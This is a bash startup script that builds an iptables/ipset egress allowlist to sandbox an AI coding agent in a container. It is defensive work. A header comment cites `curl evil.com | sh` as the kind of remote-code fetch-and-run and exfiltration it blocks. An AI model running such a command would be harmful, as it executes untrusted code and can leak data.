#!/usr/bin/env bash
# Container egress firewall — iptables + ipset allowlist.
#
# Modeled on Anthropic's claude-code devcontainer firewall. Runs at container
# startup (as root, with CAP_NET_ADMIN), then the entrypoint drops privileges
# to the pi user. Pi's outbound network access is limited to:
#   - LLM provider APIs
#   - OAuth login endpoints
#   - GitHub (so `gh` and `pi install git:...` work)
#   - npm registry (so `pi install npm:...` works)
#   - DNS to the container's resolver
#
# Everything else is denied. The agent CAN modify files in /workspace
# (it's a bind mount, that's the point) but it can't `curl evil.com | sh`
# or exfiltrate to arbitrary hosts.
#
# Escape hatch: set PI_DISABLE_FIREWALL=1 in the environment to skip.

set -euo pipefail

log() { printf '[firewall] %s\n' "$*" >&2; }

# Allowed domains. Add to this list and rebuild the image to extend.
ALLOWED_DOMAINS=(
    # --- LLM provider APIs ---
    api.anthropic.com
    api.openai.com
    generativelanguage.googleapis.com
    openrouter.ai
    api.deepseek.com
    api.x.ai
    api.mistral.ai
    api.groq.com

    # --- OAuth / login flows (for `/login` inside pi) ---
    auth.openai.com
    chatgpt.com
    console.anthropic.com
    claude.ai

    # --- Package registries ---
    registry.npmjs.org
    registry.npmjs.com

    # --- pi self ---
    pi.dev

    # --- Git / GitHub (for gh CLI + `pi install git:...`) ---
    github.com
    api.github.com
    codeload.github.com
    objects.githubusercontent.com
    raw.githubusercontent.com
)

# 1) Flush existing FILTER table rules. Idempotent — supports re-init.
# Do NOT flush nat/mangle: Docker installs NAT rules that redirect
# 127.0.0.11:53 to its embedded DNS resolver, and flushing them breaks
# all subsequent DNS lookups (including the `dig` calls below).
iptables -F
iptables -X

# 2) Loopback unrestricted.
iptables -A INPUT  -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# 3) DNS — only to nameserver(s) actually listed in /etc/resolv.conf.
# Linux Docker uses 127.0.0.11 (embedded resolver). macOS Docker Desktop uses
# 192.168.65.x (vpnkit gateway). Pinning either statically breaks the other.
# Pinning to the listed resolver still narrows the DNS-tunnel exfil surface
# (single operator-controlled destination) without hardcoding a platform.
if [[ -r /etc/resolv.conf ]]; then
    dns_count=0
    while IFS= read -r ns; do
        # IPv4 only — IPv6 is disabled at the sysctl/ip6tables layer.
        [[ "$ns" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
        iptables -A OUTPUT -p udp -d "$ns" --dport 53 -j ACCEPT
        iptables -A OUTPUT -p tcp -d "$ns" --dport 53 -j ACCEPT
        log "  DNS allow → $ns"
        dns_count=$((dns_count + 1))
    done < <(awk '/^nameserver /{print $2}' /etc/resolv.conf)
    if [[ "$dns_count" == "0" ]]; then
        log "WARN: /etc/resolv.conf had no IPv4 nameservers — DNS will not work"
    fi
else
    log "WARN: /etc/resolv.conf missing — DNS will not work"
fi

# 4) Allow established/related (so responses to our outbound requests come back).
iptables -A INPUT  -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 5) Build the allowlist ipset from resolved IPs.
ipset destroy allowed-domains 2>/dev/null || true
ipset create allowed-domains hash:net family inet hashsize 1024 maxelem 65536

resolved_total=0
for domain in "${ALLOWED_DOMAINS[@]}"; do
    # +short prints one IP per line. Some hostnames return many (CDN). Add each.
    ips=$(dig +short +time=2 +tries=2 "$domain" A 2>/dev/null \
            | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' || true)
    if [[ -z "$ips" ]]; then
        log "WARN: no A records for $domain (skipping)"
        continue
    fi
    count=0
    for ip in $ips; do
        ipset add allowed-domains "$ip" -exist
        count=$((count + 1))
    done
    resolved_total=$((resolved_total + count))
    log "  $domain: $count IP(s)"
done

# 6) Permit egress to anything in the allowlist set.
iptables -A OUTPUT -m set --match-set allowed-domains dst -j ACCEPT

# 7) Default policy: deny everything else.
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

# 8) IPv6 belt-and-suspenders: even though compose disables IPv6 via sysctls,
# also DROP at the ip6tables policy level so any future config slip is caught.
# Skip gracefully if ip6tables isn't present (kernel without v6).
if command -v ip6tables >/dev/null 2>&1; then
    ip6tables -F 2>/dev/null || true
    ip6tables -X 2>/dev/null || true
    ip6tables -P INPUT DROP   2>/dev/null || true
    ip6tables -P OUTPUT DROP  2>/dev/null || true
    ip6tables -P FORWARD DROP 2>/dev/null || true
    log "ip6tables: default-deny applied"
fi

log "ready — ${#ALLOWED_DOMAINS[@]} domains, $resolved_total IPs in allowlist"
